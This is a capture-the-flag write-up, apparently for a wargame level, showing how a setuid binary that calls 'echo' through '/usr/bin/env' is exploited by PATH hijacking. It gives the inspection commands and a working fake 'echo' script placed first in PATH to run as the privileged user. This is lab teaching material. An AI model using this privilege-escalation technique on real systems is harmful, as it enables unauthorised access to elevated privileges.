# Level 03

**Exploit:** PATH hijacking

The program runs `echo` by name, so placing a replacement earlier in `PATH` makes it run our command.

## Walkthrough

Inspect the `level03` executable:

```bash
file level03
```

Output:

```text
level03: setuid setgid ELF 32-bit LSB executable..... <- standard executable
```

```bash
strings ./level03
```

Output:

```text
...
/usr/bin/env echo Exploit me
...
```

```bash
ltrace ./level03
```

Output:

```text
...
system("/usr/bin/env echo Exploit me"Exploit me
...
```

The program calls `/usr/bin/env echo`, which searches `PATH` for the executable. Create a replacement `echo` that runs `getflag`:

```bash
mkdir /tmp/fakebin
echo "getflag" > /tmp/fakebin/echo
chmod +x /tmp/fakebin/echo
```

Put the replacement directory first in `PATH`, then run the level executable:

```bash
export PATH=/tmp/fakebin:$PATH
./level03
```

The program now runs the replacement command and prints the flag.
